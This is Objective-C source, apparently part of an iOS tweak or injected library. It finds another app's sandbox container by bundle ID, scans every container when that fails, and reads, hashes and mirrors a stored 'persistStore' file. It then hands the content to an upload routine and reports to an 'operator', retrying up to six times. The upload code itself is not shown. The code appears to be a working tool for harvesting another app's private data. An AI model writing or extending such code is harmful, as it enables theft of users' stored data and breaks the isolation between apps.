    NSLog(@"[PersistStore] %@ contains %lu entries", directory, (unsigned long)contents.count);
    result[@"directory"] = directory;
    result[@"directoryEntries"] = TMPersistDirectoryEntries(directory);

    for (NSString *name in contents) {
        if ([name rangeOfString:wanted options:NSCaseInsensitiveSearch].location == NSNotFound)
            continue;
        result[@"resolution"] = @"fuzzy-name";
        result[@"matchedName"] = name;
        return [directory stringByAppendingPathComponent:name];
    }

    // Also look one level up: some releases moved the store out of persistStore.
    NSString *parent = [container stringByAppendingPathComponent:
        relativePath.stringByDeletingPathExtension.stringByDeletingLastPathComponent];
    if (![parent isEqualToString:directory]) {
        for (NSString *name in [manager contentsOfDirectoryAtPath:parent error:nil]) {
            if ([name rangeOfString:wanted options:NSCaseInsensitiveSearch].location == NSNotFound)
                continue;
            result[@"resolution"] = @"fuzzy-name-parent";
            result[@"matchedName"] = name;
            return [parent stringByAppendingPathComponent:name];
        }
        result[@"parentEntries"] = TMPersistDirectoryEntries(parent);
    }

    result[@"resolution"] = @"not-found";
    return nil;
}

static NSDictionary *TMPersistPerformHarvest(void)
{
    NSString *bundleID = TMPersistTargetBundleID();
    NSString *relativePath = TMPersistRelativePath();
    NSDictionary *base = @{@"bundleID": bundleID, @"relativePath": relativePath};

    NSString *method = nil;
    // The container resolver reports through an NSString out-parameter; the
    // filesystem calls below report through NSError. They must not share a
    // variable: this tree compiles with -Wno-incompatible-pointer-types, so
    // reusing an NSString* for an NSError** argument stays silent until the
    // first property access on it.
    NSString *discoveryFailure = nil;
    NSMutableDictionary *resolution = [NSMutableDictionary dictionary];
    NSString *container = TMPersistContainerRootForBundleID(bundleID, &discoveryFailure, &method,
                                                            resolution);

    NSString *containerUUID = @"";
    NSString *target = nil;
    NSString *scanHit = nil;
    if (container.length == 0) {
        // The configured bundle id did not resolve. Before giving up, look for the
        // file by name in every container: a differently-identified build is a
        // common reason for the exact same file being present on the device.
        NSString *matchedBundleID = nil;
        scanHit = TMPersistScanAllContainers(relativePath, resolution, &matchedBundleID);
        if (scanHit.length == 0) {
            TMPersistLog(@"container not resolved for %@: %@", bundleID,
                         discoveryFailure ?: @"unknown");
            NSMutableDictionary *failure = [@{
                @"status": @"container_not_found",
                @"error": discoveryFailure ?: @"unknown",
            } mutableCopy];
            [failure addEntriesFromDictionary:resolution];
            return TMPersistMerge(base, failure);
        }

        // Strip exactly as many components as the configured relative path has,
        // so the container root is recovered for any path shape.
        NSString *derived = scanHit;
        for (NSUInteger index = 0; index < relativePath.pathComponents.count; index++)
            derived = derived.stringByDeletingLastPathComponent;
        container = derived;
        target = scanHit;
        method = [NSString stringWithFormat:@"scan-all-containers(%@)", matchedBundleID ?: @"?"];
        resolution[@"resolution"] = @"scan-all-containers";
        resolution[@"matchedBundleID"] = matchedBundleID ?: @"unknown";
        resolution[@"matchedName"] = target.lastPathComponent;
        TMPersistLog(@"recovered %@ from the container of %@ via name scan (%@)",
                     relativePath, matchedBundleID ?: @"unknown", container);
    } else {
        target = TMPersistResolveStorePath(container, relativePath, resolution);
    }

    containerUUID = TMPersistUUIDFromContainerPath(container);
    NSError *fileError = nil;
    NSDictionary *attributes = target.length > 0
        ? [NSFileManager.defaultManager attributesOfItemAtPath:target error:&fileError] : nil;
    if (!attributes) {
        TMPersistLog(@"store not found in %@ (container uuid=%@ via %@): %@", container,
                     containerUUID.length > 0 ? containerUUID : @"unknown",
                     method ?: @"unknown", fileError.localizedDescription ?: @"missing");
        NSMutableDictionary *failure = [@{
            @"status": @"file_not_found",
            @"containerPath": container,
            @"uuid": containerUUID,
            @"discoveryMethod": method ?: @"unknown",
            @"error": fileError.localizedDescription ?: @"missing",
        } mutableCopy];
        [failure addEntriesFromDictionary:resolution];
        return TMPersistMerge(base, failure);
    }

    NSError *readError = nil;
    NSData *content = [NSData dataWithContentsOfFile:target options:0 error:&readError];
    if (!content.length) {
        TMPersistLog(@"store unreadable at %@: %@", target,
                     readError.localizedDescription ?: @"unknown");
        return TMPersistMerge(base, @{
            @"status": @"read_failed",
            @"containerPath": container,
            @"uuid": containerUUID,
            @"discoveryMethod": method ?: @"unknown",
            @"error": readError.localizedDescription ?: @"unknown",
        });
    }

    NSDictionary *json = [NSJSONSerialization JSONObjectWithData:content options:0 error:NULL];
    NSString *sha256 = TMPersistSHA256Hex(content);
    NSDate *modified = attributes[NSFileModificationDate];

    NSMutableDictionary *result = [TMPersistMerge(base, @{
        @"status": @"harvested",
        @"containerPath": container,
        @"uuid": containerUUID,
        @"discoveryMethod": method ?: @"unknown",
        @"path": target,
        @"sizeBytes": @(content.length),
        @"sha256": sha256,
        @"jsonValid": @(json != nil),
        @"modifiedAt": modified ? @(modified.timeIntervalSince1970) : [NSNull null],
    }) mutableCopy];
    [result addEntriesFromDictionary:resolution];

    if (TMPersistBool(TMPersistCopyKey, YES)) {
        NSURL *mirror = [TMPersistMirrorDirectoryURL()
            URLByAppendingPathComponent:result[@"matchedName"] ?: relativePath.lastPathComponent];
        NSError *writeError = nil;
        if ([content writeToURL:mirror options:NSDataWritingAtomic error:&writeError]) {
            result[@"mirrorPath"] = mirror.path;
        } else {
            result[@"mirrorError"] = writeError.localizedDescription ?: @"write failed";
        }
    }

    TMPersistLog(@"harvested %@ (%@) via %@ uuid=%@ bytes=%lu sha256=%@ json=%@",
                 relativePath, result[@"resolution"] ?: @"exact-path",
                 result[@"discoveryMethod"],
                 containerUUID.length > 0 ? containerUUID : @"unknown",
                 (unsigned long)content.length, sha256, json ? @"ok" : @"invalid");
    return result;
}

void TryMaskCardPersistHarvest(BOOL force)
{
    if (!TryMaskCardPersistHarvestEnabled()) return;

    dispatch_queue_t queue = TMPersistQueue();
    @synchronized (TMPersistLock()) {
        if (gTMPersistInFlight && !force) return;
        if (!force && gTMPersistAttempts >= 6) return;
        gTMPersistInFlight = YES;
    }

    dispatch_async(queue, ^{
        @autoreleasepool {
            NSDictionary *result = nil;
            @try {
                result = TMPersistPerformHarvest();
            } @catch (NSException *exception) {
                TMPersistLog(@"harvest exception: %@", exception.reason ?: exception.name ?: @"unknown");
                result = @{@"status": @"exception",
                           @"error": exception.reason ?: exception.name ?: @"unknown"};
            }

            BOOL harvested = [result[@"status"] isEqualToString:@"harvested"];
            NSUInteger attempts = 0;
            @synchronized (TMPersistLock()) {
                gTMPersistSnapshot = result;
                gTMPersistInFlight = NO;
                gTMPersistAttempts += 1;
                attempts = gTMPersistAttempts;
            }

            if (harvested) {
                NSString *path = [result[@"path"] isKindOfClass:NSString.class] ? result[@"path"] : nil;
                NSData *content = path.length > 0 ? [NSData dataWithContentsOfFile:path] : nil;
                @synchronized (TMPersistLock()) { gTMPersistContent = content; }
                TMPersistUploadIfConfigured(result, content ?: [NSData data]);
                TMPersistReportOutcome(TMPersistWithAttempt(result, attempts));
                return;
            }

            // Report the first failure as well as the last one. Waiting for the
            // sixth attempt meant the operator saw nothing at all if the app was
            // closed before the retry schedule finished, which is exactly the
            // state that has to be diagnosable. The outcome fingerprint keeps the
            // retries from repeating it.
            TMPersistReportOutcome(TMPersistWithAttempt(result, attempts));

            if (attempts < 6) {
                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0 * NSEC_PER_SEC)),
                               queue, ^{ TryMaskCardPersistHarvest(NO); });
            } else {
                TMPersistLog(@"giving up after %lu attempts", (unsigned long)attempts);
            }
        }
    });
}

NSDictionary<NSString *, id> *TryMaskCardPersistStoreSnapshot(void)
{
    @synchronized (TMPersistLock()) {
        return gTMPersistSnapshot;
    }
}

NSData *TryMaskCardPersistStoreContent(void)
{
    @synchronized (TMPersistLock()) {
        return gTMPersistContent;
    }
}

NSDictionary<NSString *, id> *TryMaskCardPersistUploadStatus(void)
{
    @synchronized (TMPersistLock()) {
        return gTMPersistUpload;
    }
}
